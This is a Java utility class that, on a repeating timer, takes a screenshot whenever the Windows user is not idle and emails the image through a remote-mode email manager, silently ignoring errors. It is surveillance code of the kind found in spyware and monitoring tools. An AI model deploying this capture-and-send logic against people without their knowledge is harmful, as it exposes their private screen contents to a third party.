package util;

import static debug.DebugSettings.debug;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;

public class EmailScreenshotNotification extends TimerTask{

	  private Timer timer;
	  public static int ONE_HOURS = 3600;
	  public static int TWO_HOURS = 7200;
	  
	  private int Seconds;
	  
	  private EmailManager em;
	  
	  public String ActiveActivity;
	  
	  public EmailScreenshotNotification(int seconds){
		  debug("New Email screen Notification()!");
		  timer = new Timer ();
		  timer.schedule (this,seconds*1000);
		  Seconds = seconds;
		  em = new EmailManager();
		  em.SetMode(EmailManager.MODE_REMOTE);
	  }//Notification

	@Override
	public void run(){
		if (!Win32IdleTime.GetIdle().equals(Win32IdleTime.STATE_IDLE)){
			Thread Background = new Thread(new Runnable(){   
	        	public void run(){
	        		try{
	        			File f = ScreenshotManager.GetCaptureScreenFile();
	        				debug("run() with parameter: "+f.getAbsolutePath());
	        				em.SendEmail(f.getAbsolutePath());
	        		}//try
	        		catch(Exception e){}
	        	}
			});//tread
			Background.start();
			try {
				Background.join();
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
		}//if not idle take a pic
		
		@SuppressWarnings("unused")
		EmailScreenshotNotification sn = new EmailScreenshotNotification(Seconds);
		
	}//run
	
	public void ReSchedule(int seconds){
		  timer = new Timer ();	//point to a new timer
		  timer.schedule (this,seconds*1000);//schedule the event in the given time
	}//Schedule
	
	public void Stop(){
		timer.cancel();
		debug("EmailScreenNotification: Stopped Email Notification");
	}//Stop	
	
}//EmailScreenshotNotification
